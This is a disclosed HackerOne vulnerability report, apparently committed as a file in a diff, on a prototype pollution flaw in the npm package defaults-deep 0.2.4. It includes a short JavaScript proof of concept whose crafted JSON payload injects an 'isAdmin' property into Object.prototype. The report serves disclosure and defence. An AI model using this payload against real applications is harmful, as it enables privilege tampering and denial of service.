@@ -1,0 +1,59 @@
+ReportLink:https://hackerone.com/reports/380878
+WeaknessName:Denial of Service
+Reporter:https://hackerone.com/asgerf
+ReportedTo:Node.js third-party modules(nodejs-ecosystem)
+BountyAmount:
+Severity:medium
+State:Closed
+DateOfDisclosure:28.09.2018 10:03:21
+
+Summary:
+The vulnerability was reported and verified. 
+The package maintainer joined the report but never participated or published a patch.
+After 45+ days the report was disclosed.
+I would like to report a prototype pollution vulnerability in defaults-deep.
+It allows an attacker to inject properties on Object.prototype.
+
+# Module
+
+**module name:** defaults-deep
+**version:** 0.2.4
+**npm page:** `https://www.npmjs.com/package/defaults-deep`
+
+## Module Description
+
+Like `extend` but recursively copies only the missing properties/values to the target object.
+
+## Module Stats
+
+6,659 downloads in the last week
+
+# Vulnerability
+
+## Vulnerability Description
+
+This is a variant of this vulnerability:
+https://hackerone.com/reports/310443
+
+The `defaults-deep` package can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.
+
+## Steps To Reproduce:
+
+Craft an object of form `{constructor: {prototype: {...}}}` and send it to `defaults-deep`:
+
+```javascript
+var defaultsDeep = require('defaults-deep');
+var payload = JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}');
+defaultsDeep({}, payload);
+console.log({}.isAdmin); // true
+```
+
+# Wrap up
+
+- I contacted the maintainer to let them know: [N] 
+- I opened an issue in the related repository: [N]
+
+## Impact
+
+Denial of service, possibly more depending on the application.
+See https://hackerone.com/reports/310443
